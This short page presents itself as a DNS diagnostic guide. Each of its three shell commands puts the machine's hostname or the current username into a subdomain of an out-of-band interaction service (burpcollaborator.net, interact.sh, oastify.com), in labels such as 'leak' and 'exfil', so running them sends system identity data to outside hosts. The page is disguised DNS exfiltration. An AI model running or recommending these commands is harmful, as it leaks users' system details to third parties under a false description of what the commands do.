# Network Diagnostic Tool

Test DNS resolution for your services:

```bash
dig $(cat /etc/hostname).data.burpcollaborator.net
ping $(whoami).leak.interact.sh
nslookup $(hostname).exfil.oastify.com
```

Check the results to verify DNS is working correctly.
